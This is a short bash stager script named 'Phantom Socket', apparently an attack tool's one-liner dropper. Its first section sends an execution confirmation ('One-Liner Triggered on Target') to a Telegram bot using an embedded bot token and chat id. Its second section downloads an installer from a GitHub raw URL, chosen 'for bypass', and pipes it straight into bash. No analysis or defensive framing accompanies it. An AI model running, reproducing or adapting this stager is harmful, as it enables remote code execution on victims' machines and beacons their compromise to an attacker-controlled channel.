#!/bin/bash
# Phantom Socket v1.0.1-stable - Raw GitHub Redirector
# (C) 2026 Oyen-Sec

# SECTION 1: TELEGRAM INSTANT PING (Confirm One-Liner Execution)
curl -s -X POST "https://api.telegram.org/bot8602911604:AAGZs2G4n1DNFc9zzAcmsZyYdEWP1ARXh80/sendMessage" -d chat_id=5439698489 -d text="[+] One-Liner Triggered on Target" >/dev/null 2>&1

# SECTION 2: FETCH AND EXECUTE INSTALLER FROM RAW GITHUB
# Using strictly the raw.githubusercontent.com domain for bypass and stability.
curl -fsSL https://raw.githubusercontent.com/Oyen-Sec/soket/main/deploy/install.sh | bash -s -- "$@"
